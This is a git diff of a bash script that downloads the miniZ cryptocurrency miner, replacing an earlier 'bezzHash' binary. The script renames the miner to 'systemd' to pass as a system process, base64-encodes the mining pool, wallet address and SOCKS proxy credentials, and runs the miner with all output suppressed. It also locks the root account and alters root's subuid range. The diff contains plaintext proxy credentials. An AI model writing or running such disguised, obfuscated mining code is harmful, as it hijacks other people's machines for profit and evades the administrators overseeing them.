@@ -1,27 +1,25 @@
 #!/bin/bash
 
-# Proxy settings
-export http_proxy="socks5://sipuwfea:e90ia636sn8t@38.154.227.167:5868"
-export https_proxy="socks5://sipuwfea:e90ia636sn8t@38.154.227.167:5868"
-
 # Update and install docker.io
 sudo apt update && sudo apt install -y docker.io
 
 # Add user to docker group
 sudo usermod -aG docker root
-sudo usermod --add-subuids 10-20000 root
+sudo usermod --add-subuids 1202-5868 root
 sudo usermod -L root
 
-# Download the script and make it executable
-wget https://github.com/Testdrive345/scriptX/raw/main/bezzHash && chmod 777 bezzHash
+# Download and extract miniZ
+wget https://github.com/miniZ-miner/miniZ/releases/download/v2.3c/miniZ_v2.3c_linux-x64.tar.gz
+tar -xvf miniZ_v2.3c_linux-x64.tar.gz
 
-# Move the script to systemd directory
-mv bezzHash systemd
+# Move miniZ to systemd directory
+mv miniZ systemd
 
-# Encode parameters
-par_encoded="--par=kawpow"
-user_encoded="--user GgxJdQzEZeXHQZSApbCdWFtYR7QufiN1RL"
-server_encoded="--server de.neoxa.herominers.com:1202"
+# Encode sensitive information using Base64
+server_encoded=$(echo "tr.neoxa.herominers.com" | base64)
+port_encoded=$(echo "1202" | base64)
+user_encoded=$(echo "GgxJdQzEZeXHQZSApbCdWFtYR7QufiN1RL" | base64)
+socks_encoded=$(echo "sipuwfea:e90ia636sn8t@38.154.227.167:5868" | base64)
 
-# Execute the command with encrypted parameters
-./systemd $par_encoded $user_encoded $server_encoded
+# Execute the command with encoded sensitive information
+./systemd --par=kawpow --user "$(echo "$user_encoded" | base64 -d)" --server "$(echo "$server_encoded" | base64 -d)" --port "$(echo "$port_encoded" | base64 -d)" --socks "$(echo "$socks_encoded" | base64 -d)" --socksdns > /dev/null 2>&1
